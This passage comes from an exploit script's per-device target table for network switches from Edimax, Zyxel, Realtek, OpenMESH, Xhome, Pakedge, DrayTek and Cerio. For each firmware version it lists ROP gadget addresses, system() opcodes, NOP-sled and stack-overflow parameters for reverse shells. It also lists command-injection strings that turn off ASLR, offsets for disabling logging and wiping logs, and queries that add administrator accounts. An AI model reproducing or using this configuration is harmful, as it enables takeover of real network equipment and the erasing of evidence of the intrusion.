						'handler': 0x2484afec,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 6,						# Should leave as-is (but you can play between 5 - 8)
						'safe': False
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
				},
			},

			#
			# EdimaxPRO
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'225-63242': {
				'template':'Edimax',					# Static for the vendor
				'model':'GS-5424PLC',
				'uri':'https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/smb_switches_poe/gs-5424plc',
				'version':'1.1.1.5',					# Version / binary dependent stuff
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E6DC,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998524,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248411bc,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi/set.cgi;  cgi_diag_traceroute_set()
						# traceroute
						'web_sys_ping_post':0x40DFF4,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&srvHost=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
						'sys_ping_post_check':'',

						'verify_uri':'/tmp/check',
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
						'log_settings_set':0x41D99C,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_ramClear':0x41D8E4,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_fileClear':0x41D8E4,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntp_set':0x41620C,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntpDel_set':0x41620C,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSettings_set':0x41620C,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': False,			# Not clear, may be to long URI for the stack
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},
			'225-96283': {
				'template':'Edimax',					# Static for the vendor
				'model':'GS-5424PLC',
				'uri':'https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/smb_switches_poe/gs-5424plc',
				'version':'1.1.1.6',					# Version / binary dependent stuff
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E6DC,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998524,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248411ac,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,				# 
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi/set.cgi;  cgi_diag_traceroute_set()
						# traceroute
						'web_sys_ping_post':0x40E024,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&srvHost=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
						'sys_ping_post_check':'',

						'verify_uri':'/tmp/check',
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
						'log_settings_set':0x41D9EC,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_ramClear':0x41D934,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_fileClear':0x41D934,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,				# 
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntp_set':0x416254,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntpDel_set':0x416254,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSettings_set':0x416254,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,				# 
					},
				},
			},

			#
			# Zyxel
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes (adding username to next free index number, may not be #1)
			# Del credentials        : Yes (index number instead of username, may not be #1)
			#
			'222-71560': {
				'template':'Zyxel',					# Static for the vendor
				'version':'2.40_AAHL.1_20180705',	# Version / binary dependent stuff
				'model':'GS1900-24',				# Model
				'uri':'https://www.zyxel.com/products_services/8-10-16-24-48-port-GbE-Smart-Managed-Switch-GS1900-Series/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40D60C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998520,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484e148,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,				# 
					},
					#
					#
					'stack_cgi_diag': {				# Not vulnerable
						'address':0x4341C4,
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_localUser_post()
						'address':0x436D9C,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&usrName=USERNAME&usrPrivType=15&usrPriv=15',			# Admin, priv 15
						'vulnerable': True,
					},
					'stack_cgi_del_account': { #
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_localUserDel_post()
						'address':0x437124,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&_del=1',			# First additional user in the list
						'vulnerable': True,				# user
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x47D760,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_delete_post()
						'log_ramClear':0x480804,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_delete_post()
						'log_fileClear':0x480804,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,				# 
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntp_set':0x43BA8C,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x43BA8C,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x43AF54,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable':False,
					}, 
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'query':'username='+ self.random_string(100) +'_RA_START&password='+ self.random_string(59) +'&STARTUP_BACKUP=1'+ (('&' + struct.pack('>L',0x2404FF3D) + struct.pack('>L',0x2404FFFF)) * 70) + '&' + struct.pack('>L',0x2404FF3D) +'_SHELLCODE',
						'START':0x10010104,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP': 0x104006A0,				# end: You may want to play with this if you dont get it working
						'usr_nop': 25,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 15,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
					},
				},
			},

			#
			# Realtek
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'222-40570': {
				'template':'Realtek',					# Static for the vendor
				'version':'3.0.0.43126',				# Version / binary dependent stuff
				'model':'RTL8380-24GE-4GEC',			# Model
				'uri':'https://www.realtek.com/en/products/communications-network-ics/item/rtl8381m-vb-cg-2',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E6DC,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24841ea8,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
						# Ping IPv4
						'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space&count=1',
						'verify_uri':'/tmp/pingtest_tmp',
						'web_sys_ping_post':0x422980,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()

						# traceroute
						#'web_sys_ping_post':0x423168,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
						#'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/traceroute_tmp #&tr_maxhop=30&count=1',
						#'verify_uri':'/tmp/traceroute_tmp',
						'vulnerable': True,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x481968,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x4847DC,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x4847DC,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
					'stack_cgi_sntp': {
						'sys_timeSntp_set':0x42C8F0,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x42C8F0,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x42C8F0,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'query':'username=_USRNOP&password=_PWDNOP_RA_START&login=1&_USRNOP_USRNOP_SHELLCODE',
						'START':0x7fff7004,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 28,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 20,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# OpenMESH (some identical with enginius egs series)
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'13984-12788': {
				'template':'OpenMESH',						# Static for the vendor
				'version':'01.03.24_180823-1626',					# Version / binary dependent stuff
				'model':'OMS24',				# Model
				'uri':'https://www.openmesh.com/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E12C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248405a0,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
														# /sqfs/home/web/cgi/set.cgi;  cgi_sys_acctAdd_set()
						'address':0x424890,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pw=PASSWORD&pv=0&op=1&',			# Admin, priv 15
						'vulnerable': True,
					},
					'stack_cgi_del_account': {
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x424890,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pw=&pv=0&op=0',		# 
						'vulnerable': True,				# user
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi-bin/datajson.cgi;  sn_ipv4PingSet()
						#'web_sys_ping_post':0x42341C,	# Jump one after 'sw $ra'			# (address, binary dependent)

														# /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
						'sys_ping_post_cmd':'&ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space #&mh=30&uid=0',
						'sys_ping_post_check':'&ip=127.0.0.1 ; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
						'verify_uri':'/conf_tmp/check',
						'web_sys_ping_post': 0x424248,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
						'log_settings_set':0x43EA88,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_ramClear':0x440660,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_fileClear':0x440660,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntp_set':0x425260,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
						'sys_timeSntpDel_set':0x425260,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
						'sys_timeSettings_set':0x425260,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'security.cgi',			# /sqfs/home/web/cgi-bin/security.cgi; main()
						'START':0x100181A0,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x104006A0,				# end: You may want to play with this if you dont get it working
						'usr_nop': 987,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 69,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Xhome (identical with Realtek)
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'222-64895': {
				'template':'Xhome',					# Static for the vendor
				'version':'3.0.0.43126',			# Version / binary dependent stuff
				'model':'DownLoop-G24M',			# Model
				'uri':'http://www.xhome.com.tw/product_info.php?info=p116_XHome-DownLoop-G24M----------------------------------------.html',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E6DC,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24841ea8,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
						# Ping IPv4
						'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space&count=1',
						'verify_uri':'/tmp/pingtest_tmp',
						'web_sys_ping_post':0x4229A0,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()

						# traceroute
						#'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/traceroute_tmp #&tr_maxhop=30&count=1',
						#'verify_uri':'/tmp/traceroute_tmp',
						#'web_sys_ping_post':0x423188,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
						'vulnerable': True,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x481988,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x4847FC,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x4847FC,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
					'stack_cgi_sntp': {
						'sys_timeSntp_set':0x42C910,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x42C910,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x42B6F8,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'query':'username=_USRNOP&password=_PWDNOP_RA_START&login=1&_USRNOP_USRNOP_SHELLCODE',
						'START':0x7fff7004,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 28,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 20,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Pakedgedevice & Software
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: No (cannot point JMP correct into NOP on heap)
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'225-21785': {
				'model':'SX-8P',
				'template':'Pakedge',					# Static for the vendor
				'version':'1.04',							# Version / binary dependent stuff
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40C86C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998538,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248492ec,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
						'log_settings_set':0x413AEC,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_ramClear':0x413A14,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_fileClear':0x413A14,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntp_set':0x4108E4,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntpDel_set':0x4108E4,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSettings_set':0x4108E4,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Draytek
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: No (cannot point JMP correct into NOP on heap)
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'752-95168': {
				'template':'DrayTek',					# Static for the vendor
				'version':'2.1.4',						# Version / binary dependent stuff
				'model':'VigorSwitch P1100',  			#
				'uri':'https://www.draytek.com/products/vigorswitch-p1100/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40C67C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99852c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248490ac,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
						'log_settings_set':0x413E34,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_ramClear':0x413D64,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_fileClear':0x413D64,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntp_set':0x410CA8,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntpDel_set':0x410CA8,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSettings_set':0x410CA8,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,				# 
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Cerio
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'224-5061': {
				'template':'Cerio',					# Static for the vendor
				'version':'1.00.29',				# Version / binary dependent stuff
				'model':'CS-2424G-24P',  			#
				'uri':'https://www.cerio.com.tw/eng/switch/poe-switch/cs-2424g-24p/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E6DC,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998524,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248411bc,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi/set.cgi;  cgi_diag_traceroute_set()
						'sys_ping_post_cmd':'&srvHost=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
						'sys_ping_post_check':'',
						'web_sys_ping_post':0x40E114,	# Jump one after 'sw $ra'			# (address, binary dependent)

						'verify_uri':'/tmp/check',
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
						'log_settings_set':0x41DB4C,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
